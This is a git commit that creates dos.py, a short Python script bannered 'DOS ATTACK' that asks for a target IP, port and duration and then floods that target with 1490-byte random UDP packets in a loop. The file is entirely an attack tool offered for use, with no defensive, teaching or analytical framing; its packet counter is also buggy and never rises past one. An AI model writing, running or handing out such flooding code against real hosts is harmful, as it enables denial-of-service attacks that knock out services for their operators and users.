8e593bd0cdacadf4a41fc1c139b864b005199f67
Darkc0de <87938019+1madtanker1@users.noreply.github.com>
2022-01-01 14:27:32 -0400

    Create dos.py

---
+++ dos.py
@@ -0,0 +1,28 @@
+import socket
+import random
+import time
+import pyfiglet
+
+sock = socket.socket (socket.AF_INET,socket.SOCK_DGRAM)
+
+bytes = random._urandom(1490)
+
+ascii_banner = pyfiglet.figlet_format("DOS ATTACK")
+print(ascii_banner)
+
+a = input("Enter an IP to attack > ")
+ip = (a)
+port = int(input("Enter the port to attack > "))
+duration = int(input("How long should Bomb send packets (how many seconds)? > "))
+sent = 0
+timeout = time.time() + duration
+
+while True:
+    if time.time() > timeout:
+        break
+    else:
+        pass
+    sock.sendto(bytes,(ip, port))
+    Sent = sent + 1
+    print("sent %s packets to %s through port %s"%(Sent, ip, port))
+
